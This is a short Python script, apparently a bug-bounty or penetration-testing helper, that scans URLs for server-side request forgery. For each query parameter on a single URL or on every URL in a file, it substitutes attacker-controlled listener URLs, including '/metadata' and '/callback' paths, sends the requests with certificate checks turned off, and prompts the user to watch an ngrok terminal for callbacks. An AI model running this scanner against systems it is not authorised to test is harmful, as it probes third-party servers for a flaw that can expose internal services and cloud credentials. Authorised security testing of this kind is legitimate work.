#!/usr/bin/env python3

import requests
import urllib.parse


# ============================================================
# SSRF PAYLOADS
# ============================================================

def generate_ssrf_payloads(listener):
    return [
        listener,
        f"{listener}/ssrf",
        f"{listener}/metadata",
        f"{listener}/callback?id=test"
    ]


# ============================================================
# PARAM DISCOVERY
# ============================================================

def extract_params(url):
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    return parsed, params


def rebuild_url(parsed, params):
    query = urllib.parse.urlencode(params, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=query))


# ============================================================
# SINGLE ENDPOINT SSRF SCAN
# ============================================================

def run_ssrf_scan_single(url, listener):
    print("\n[ SSRF SCAN (SINGLE TARGET) ]")

    payloads = generate_ssrf_payloads(listener)

    parsed, params = extract_params(url)

    if not params:
        print("[!] No parameters found in URL")
        return

    tested = []

    for param in params:
        print(f"\n[+] Testing parameter: {param}")

        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload

            target = rebuild_url(parsed, test_params)

            print(f"    -> {target}")

            try:
                r = requests.get(target, timeout=5, verify=False)

                print(f"       Status: {r.status_code}")
                tested.append(target)

            except requests.exceptions.RequestException:
                print("[ERROR] Request failed")

    print("\n========== SSRF TESTS SENT ==========")
    print("Monitor ngrok terminal for incoming callbacks.")
    for t in tested:
        print(t)


# ============================================================
# FILE MODE
# ============================================================

def run_ssrf_scan_file(urls_file, listener):
    print("\n[ SSRF SCAN (FILE MODE) ]")

    with open(urls_file) as f:
        urls = [u.strip() for u in f if u.strip()]

    for url in urls:
        run_ssrf_scan_single(url, listener)